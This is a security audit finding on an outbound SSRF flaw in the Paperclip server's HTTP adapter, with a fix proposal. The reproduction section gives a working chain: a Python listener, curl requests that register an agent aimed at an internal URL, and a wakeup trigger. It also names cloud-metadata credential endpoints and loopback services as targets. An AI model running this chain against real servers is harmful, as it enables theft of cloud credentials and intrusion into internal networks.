# High · H-1 · Outbound SSRF in HTTP adapter — no private-IP/DNS guard

- **Status:** Open · **Confirmed live (full chain)**
- **Severity:** High
- **CWE:** CWE-918
- **Found by:** Manual review
- **Detected:** 2026-05-18
- **Location(s):**
  - `server/src/adapters/http/execute.ts:19`

## Summary

The HTTP adapter calls `await fetch(url, ...)` where `url` comes straight
from adapter config (`asString(config.url, "")`). No allow-list, no DNS
resolution check, no private-IP block, no port filter, no scheme filter.

## Impact

Anyone able to author an HTTP adapter (today: company admins; future:
plugins) can pivot the Paperclip server into the internal network:
- `http://169.254.169.254/latest/meta-data/iam/security-credentials/` →
  cloud IAM credentials.
- `http://127.0.0.1:5432` → Postgres unix port, redis, k8s API.
- `http://[::1]:3100/admin/...` → reach loopback-only admin endpoints.

`private-hostname-guard` middleware exists but only protects **inbound**
requests *to* Paperclip, not **outbound** ones *from* Paperclip.

## Reproduction

### Result: **Confirmed live — full chain reproduced**

End-to-end exploit against a default-secret deployment:

1. **Stand up a sink** on `127.0.0.1:4444` so we can see the request body:
   ```python
   # report/security/pentest/ssrf-sink.py
   import socket
   srv = socket.socket(); srv.bind(("127.0.0.1", 4444)); srv.listen(8)
   while True:
       c, _ = srv.accept()
       print(c.recv(4096).decode("latin1","replace"))
       c.sendall(b"HTTP/1.1 200 OK\r\nContent-Length: 16\r\n\r\n{\"caught\":true}\n")
       c.close()
   ```
2. **Register the SSRF agent** (`local_implicit` admin, no auth needed):
   ```bash
   curl -X POST http://localhost:3100/api/companies/<id>/agents -H 'content-type: application/json' -d '{
     "name":"SSRF Sink Probe v2","role":"engineer","adapterType":"http",
     "adapterConfig":{"url":"http://127.0.0.1:4444/internal-from-paperclip","method":"POST","timeoutMs":3000},
     "runtimeConfig":{"heartbeat":{"enabled":true,"maxConcurrentRuns":1,"intervalMs":5000}}
   }'
   ```
3. **Trigger a wakeup**:
   ```bash
   curl -X POST http://localhost:3100/api/agents/<agent-id>/wakeup \
        -H 'content-type: application/json' \
        -d '{"source":"on_demand","reason":"pentest"}'
   # → 202 Accepted, run_id=…
   ```
4. **Sink receives the call within ~2 seconds**:
   ```
   POST /internal-from-paperclip HTTP/1.1
   host: 127.0.0.1:4444
   content-type: application/json
   user-agent: node
   content-length: 3710

   {"agentId":"58febd1d-…","runId":"0e56f8e8-…","context":{…}}
   ```

**Stored evidence:** `report/security/pentest/ssrf-capture.log` (full captured payload).

**Bonus finding — workspace context leak:** the POST body also contains the full
`paperclipEnvironment` block including absolute workspace paths
(`/root/.paperclip/instances/default/workspaces/<agentId>`), lease IDs, agent IDs,
and provider configuration. Any attacker-controlled sink learns Paperclip's internal
filesystem layout passively on every tick. Tracked separately as **H-10** below.

**Adapter quirk found during reproduction:** `server/src/adapters/http/execute.ts:25`
unconditionally sets `body: JSON.stringify(body)` even when `method = "GET"` /
`"HEAD"`. Recent Node `fetch` rejects this with `TypeError: Request with GET/HEAD
method cannot have body.` Doesn't change the exploit (POST works fine) but is a
small bug worth fixing.

Pointing at `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
on an EC2/GCE/AKS host would exfiltrate the IMDS token to the attacker's URL.
The sink-target test above is the moral equivalent in a sandbox without metadata.

**Pen-test log:** `report/security/pentest/2026-05-18-pentest-notes.md` §H-1

## Fix

1. Factor out an `assertPublicUrl(url)` helper that:
   - Rejects schemes other than http/https.
   - DNS-resolves the host and rejects RFC1918, loopback, link-local,
     multicast, ULA, IPv4-mapped, and 169.254.0.0/16.
   - Rejects non-canonical IP forms (decimal, octal, hex).
   - Re-checks the resolved IP at the time of the fetch (defeats DNS
     rebinding).
2. Call the helper from every place that fetches a config-supplied URL —
   currently `server/src/adapters/http/execute.ts:19`, future-proof for
   webhook executors and plugin proxy URLs.

## References

- Umbrella scan report: `report/security/2026-05-18-security-scan.md`
- Pen-test notes: `report/security/pentest/2026-05-18-pentest-notes.md`
